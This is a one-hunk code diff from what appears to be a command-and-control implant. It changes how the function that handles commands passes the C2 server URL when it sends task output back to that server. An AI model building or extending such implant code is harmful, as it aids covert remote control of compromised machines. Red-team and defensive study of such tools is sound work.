@@ -44,7 +44,7 @@ void HandleCmd(Task* task, MalleableProfile* currentProfile)
     // Send output
     DEBUG_PRINTF("Sending output\n");
     success = true;
-    if (!SendTaskResult(task->taskId.c_str(), C2_URL, LPBYTEToString(output, cmdOutSize).c_str(), success, currentProfile))
+    if (!SendTaskResult(task->taskId.c_str(), toWide(C2_URL), LPBYTEToString(output, cmdOutSize).c_str(), success, currentProfile))
     {
         DEBUG_PRINTF("Error sending output\n");
     }
